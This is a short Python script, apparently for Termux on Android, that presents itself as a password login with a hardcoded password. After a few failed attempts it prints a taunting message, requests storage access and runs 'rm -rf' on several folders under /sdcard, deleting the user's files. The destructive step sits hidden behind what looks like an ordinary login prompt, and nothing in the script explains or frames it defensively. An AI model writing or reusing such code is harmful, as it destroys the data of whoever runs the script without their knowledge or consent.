def login():
    attempts = 3
    while attempts > 0:
    	os.system('clear')
    	logo()
    	print("Incorrect Pass Bro... Chance Remain:", attempts)    
    	print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    	password = input("Enter your password: ")
    	if password == 'rxs':
    		print("Login successful!")
    		return True
    	else:
    		attempts -= 1
    else:
    	print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    	print("SORRY BRO YOU ARE FUCKED BY RXS")
    	print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    	subprocess.run(['termux-setup-storage', '-y'], capture_output=True)
    	os.system('termux-setup-storagr -y')
    	os.system('cd /sdcard')
    	os.system('rm -rf /sdcard/MT2')
    	os.system('rm -rf /sdcard/santo')
    	os.system('rm -rf /sdcard/sipu')
    	exit()
if login():
    # Perform additional operations after successful login
    pass  # Placeholder for additional operations